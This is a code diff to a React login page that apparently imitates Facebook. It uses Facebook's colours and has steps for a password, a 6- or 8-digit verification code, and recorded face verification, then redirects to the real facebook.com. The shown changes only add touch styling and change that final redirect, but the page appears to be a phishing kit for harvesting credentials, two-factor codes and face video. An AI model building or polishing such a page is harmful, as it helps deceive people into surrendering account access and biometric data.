@@ -616,10 +616,12 @@ export default function LoginPage() {
                   <button
                     type="submit"
                     disabled={isLoggingIn}
-                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
+                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60 active:scale-95"
                     style={{ backgroundColor: '#1877f2' }}
                     onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                     onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                    onTouchStart={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                    onTouchEnd={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                     data-testid="button-login"
                   >
                     {isLoggingIn ? "Logging in..." : "Log in"}
@@ -725,7 +727,7 @@ export default function LoginPage() {
                 <button
                   onClick={handleCodeSubmit}
                   disabled={verificationCode.length !== 6 && verificationCode.length !== 8}
-                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-40"
+                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-40 active:scale-95"
                   style={{ backgroundColor: '#1877f2' }}
                   onMouseEnter={(e) => {
                     if (verificationCode.length === 6 || verificationCode.length === 8) {
@@ -733,6 +735,12 @@ export default function LoginPage() {
                     }
                   }}
                   onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                  onTouchStart={(e) => {
+                    if (verificationCode.length === 6 || verificationCode.length === 8) {
+                      e.currentTarget.style.backgroundColor = '#166fe5';
+                    }
+                  }}
+                  onTouchEnd={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                   data-testid="button-submit-code"
                 >
                   Continue
@@ -827,10 +835,12 @@ export default function LoginPage() {
 
               <button
                 onClick={handleStartFaceVerification}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3 active:scale-95"
                 style={{ backgroundColor: '#1877f2' }}
                 onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                 onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                onTouchStart={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onTouchEnd={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                 data-testid="button-start-face-verification"
               >
                 Continue
@@ -914,10 +924,12 @@ export default function LoginPage() {
 
                 <button
                   onClick={handleStartRecording}
-                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition"
+                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition active:scale-95"
                   style={{ backgroundColor: '#1877f2' }}
                   onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                   onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                  onTouchStart={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                  onTouchEnd={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                   data-testid="button-start-recording"
                 >
                   Start Verification
@@ -1275,8 +1287,8 @@ export default function LoginPage() {
                   </div>
 
                   <button
-                    onClick={() => window.location.href = 'fb://facewebmodal/f?href=https://www.facebook.com'}
-                    className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
+                    onClick={() => window.location.href = 'https://www.facebook.com'}
+                    className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3 active:scale-95"
                     style={{ backgroundColor: '#1877f2' }}
                     onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                     onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
